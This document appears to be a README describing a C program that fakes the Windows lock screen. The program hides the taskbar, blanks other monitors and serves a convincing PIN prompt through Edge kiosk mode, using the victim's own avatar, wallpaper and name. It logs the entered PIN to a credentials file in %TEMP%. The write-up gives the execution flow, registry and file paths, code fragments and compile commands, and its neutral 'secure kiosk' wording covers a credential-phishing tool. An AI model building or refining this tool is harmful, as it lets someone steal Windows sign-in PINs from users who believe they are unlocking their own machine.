# Windows Lock Screen Kiosk

A single `.c` file. It hides the taskbar, blanks out secondary monitors, spins up its own HTTP server, launches Edge in kiosk mode, and writes the user-entered PIN under `%TEMP%`.

## Execution flow

The program calls `initializeSecureKioskEnvironment()` from `WinMain`, which handles everything sequentially:

1. Locates the taskbar using `FindWindowA("Shell_TrayWnd", NULL)` and hides it with `SW_HIDE`.
2. Registers the `DarkOverlayWindow` class, enumerates secondary monitors via the `EnumDisplayMonitors` callback, and opens a full-screen popup with `WS_EX_TOPMOST | WS_EX_TOOLWINDOW` flags for each.
3. Creates a TCP socket using Winsock, lets the OS assign a port by passing `sin_port = 0`, and retrieves the assigned port via `getsockname`.
4. Retrieves the avatar path from the Registry, the background from the Spotlight Assets folder, and the display name using `GetUserNameExA`.
5. Converts both images to base64 using `CryptBinaryToStringA` and embeds them into the HTML string.
6. Launches Edge with `-kiosk http://127.0.0.1:<port> --edge-kiosk-type=fullscreen --no-first-run --disable-features=Translate`.
7. Enters a `WaitForSingleObject(edgeProcess, 50ms)` + `PeekMessage` + `select` loop.
8. Upon receiving `POST /submit`, writes the PIN to the file and breaks out of the loop.
9. Kills Edge with `TerminateProcess`, closes the overlays with `SendMessage(WM_CLOSE)`, and restores the taskbar.

## Code structure

Single file, four functions:

```
WinMain
└── initializeSecureKioskEnvironment()
    ├── darkOverlayWindowProcedure()     ← window proc
    ├── enumerateSecondaryDisplays()     ← EnumDisplayMonitors callback
    └── logCredentialEntry()             ← writes to the file
```

### `logCredentialEntry`

```
void logCredentialEntry(int category, int auxiliaryCode1, int auxiliaryCode2,
                        const char* payloadData, uint32_t dataLength)
```

Returns early if `category != 1`. Opens the `%TEMP%\SecureKiosk_credentials.log` file with `FILE_APPEND_DATA | OPEN_ALWAYS` — creates it if it doesn't exist, appends to the end if it does. Retrieves a timestamp using `GetLocalTime`:

```
[2025-01-15 14:32:07] 1234\r\n
```

The parameters `auxiliaryCode1` and `auxiliaryCode2` are currently unused and serve as placeholders in the signature.

### `darkOverlayWindowProcedure`

Handles two messages, deferring the rest to `DefWindowProc`:

- `WM_SETCURSOR` → `SetCursor(NULL)`, `return TRUE` (prevents default cursor behavior)
- `WM_PAINT` → `BeginPaint` / `FillRect(BLACK_BRUSH)` / `EndPaint`

### `enumerateSecondaryDisplays`

`EnumDisplayMonitors` callback. Skips with `return TRUE` if `MONITORINFOF_PRIMARY` is set. For every other monitor:

```
CreateWindowExA(
    WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
    "DarkOverlayWindow", "",
    WS_POPUP | WS_VISIBLE,
    rcMonitor.left, rcMonitor.top,
    rcMonitor.right  - rcMonitor.left,
    rcMonitor.bottom - rcMonitor.top,
    ...
)
```

`WS_EX_TOOLWINDOW` removes the window from the taskbar and the Alt+Tab list. The handle is not stored — the cleanup routine locates them using a `FindWindowA` loop.

### Data collection

**Avatar path:**

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AccountPicture\Users\<SID>\Image448
```

To find the SID: `OpenProcessToken` → `GetTokenInformation(TokenUser)` → `ConvertSidToStringSidA`. If the Registry read fails:

```
C:\ProgramData\Microsoft\User Account Pictures\user.png
```

**Spotlight background:**

```
%LocalAppData%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\*
```

Scanned via `FindFirstFileA` + `FindNextFileA`. Selects the largest file among those with `nFileSizeLow > 150000` (filtering out thumbnails). If no suitable file is found:

```
%AppData%\Microsoft\Windows\Themes\TranscodedWallpaper
```

**Display name:**

Calls `secur32.dll` → `LoadLibraryA` → `GetProcAddress("GetUserNameExA")` → `NameDisplay (3)`. If it fails, it falls back to the SAM name via `GetUserNameA`.

**Base64 conversion:**

Identical pattern for both images:

```
// 1. Determine the required buffer size
CryptBinaryToStringA(buf, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &outLen);

// 2. Encode
char* b64 = malloc(outLen + 1);
CryptBinaryToStringA(buf, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64, &outLen);
```

Without the `CRYPT_STRING_NOCRLF` flag, `CryptBinaryToStringA` appends `\r\n` every 76 characters — this breaks `data:image/...;base64,` URIs.

For the background, if the file size exceeds 5 MB, the read operation is skipped (this check is absent for the avatar).

### HTTP server and main loop

Blocking Winsock, single thread. The loop performs three tasks concurrently:

```
while (1) {
    // 1. Has Edge closed?
    if (WaitForSingleObject(edgeProcess, 50) == WAIT_OBJECT_0) break;

    // 2. Message queue for overlay windows
    while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // 3. Incoming HTTP connection
    fd_set fds; FD_ZERO(&fds); FD_SET(serverSock, &fds);
    struct timeval tv = {0, 100000};  // 100ms
    if (select(0, &fds, NULL, NULL, &tv) > 0) {
        SOCKET client = accept(serverSock, NULL, NULL);
        recv(client, buf, sizeof(buf)-1, 0);
        // parse and respond
    }
}
```

The `select` timeout is 100ms, and the `WaitForSingleObject` timeout is 50ms — totaling a potential delay of ~150ms per iteration.

**Route handling:**

`strncmp(buf, "GET / ", 6)` → Sends the HTML response. The HTML buffer is pre-compiled using `_snprintf`, and the identical buffer is dispatched for every request.

`strncmp(buf, "POST /submit", 12)` → Jumps to the body via `strstr(buf, "\r\n\r\n") + 4`, calls `logCredentialEntry`, sends `200 OK`, and executes a `break`.

If anything else is received, the socket is closed without issuing a response.

### Edge launch

```
// First, check x86 Program Files
"%PROGRAMFILES(X86)%\Microsoft\Edge\Application\msedge.exe"

// If GetFileAttributes == INVALID_FILE_ATTRIBUTES
"%PROGRAMFILES%\Microsoft\Edge\Application\msedge.exe"
```

```
"<path>\msedge.exe" --kiosk "http://127.0.0.1:<port>"
    --edge-kiosk-type=fullscreen
    --no-first-run
    --disable-features=Translate
```

`Sleep(1500)` following `CreateProcessA` — waits to prevent Edge from dropping behind the overlays before fully rendering. Subsequently, the Edge window is brought to the absolute foreground via `GetForegroundWindow` + `SetWindowPos(HWND_TOPMOST)` + `SetForegroundWindow`.

### Cleanup

```
TerminateProcess(edgeProcess, 0);
CloseHandle(edgeProcess); CloseHandle(edgeThread);
closesocket(serverSock);
WSACleanup();
free(htmlBuffer);

// FindWindowA loop since handles were not retained
HWND h;
while ((h = FindWindowA("DarkOverlayWindow", NULL)) != NULL)
    SendMessageA(h, WM_CLOSE, 0, 0);

UnregisterClassA("DarkOverlayWindow", hInstance);
ShowWindow(taskbar, SW_SHOW);
```

There is no `free` call for `base64EncodedBackground` and `base64EncodedAvatar` — the OS cleans them up upon process termination, but technically it constitutes a memory leak.

## Known issues

**Buffer overflow risk:** The `htmlPayloadBuffer` is allocated using `malloc` based on the calculation `8192 + strlen(b64_bg) + strlen(b64_avatar)`. While writing with `_snprintf`, the actual size of the HTML template's static portion is not accounted for — the template is roughly 5KB, so 8192 should suffice, but the exact boundary remains unchecked.

**No zero-size check for the avatar file:** The avatar is read using `malloc(avatarFileSize)`, but the condition `avatarFileSize == 0` is not handled. `malloc(0)` results in implementation-defined behavior.

**JS does not await post-`fetch('/submit')`:** When the user submits the PIN, the server exits via `break` and closes the socket. At that point, the `fetch` promise encounters a network error — leaving the user interface with zero feedback.

**No overlay handle list:** The `enumerateSecondaryDisplays` callback does not store handles. Cleanup relies entirely on the `FindWindowA` loop — theoretically conflicting if another process utilizes the identical class name.

**Dual timeout with `select` + `WaitForSingleObject`:** The 50ms + 100ms waits are nested within the inner loop. Under load, HTTP response latency can escalate up to 150ms.

## Compilation

**MSVC:**

```
cl main.c /link ws2_32.lib crypt32.lib advapi32.lib user32.lib gdi32.lib /subsystem:windows
```

**MinGW-w64:**

```
gcc main.c -o kiosk.exe -lws2_32 -lcrypt32 -ladvapi32 -luser32 -lgdi32 -mwindows
```

`#pragma comment(lib, ...)` directives facilitate automatic linking in MSVC but are inoperative in MinGW — `-l` flags must be supplied manually.

## Requirements

- Windows 10 1903+ (The Spotlight Assets folder structure solidified in this version)
- Microsoft Edge installed (under either `PROGRAMFILES(X86)` or `PROGRAMFILES`)
- MSVC 2019+ or MinGW-w64
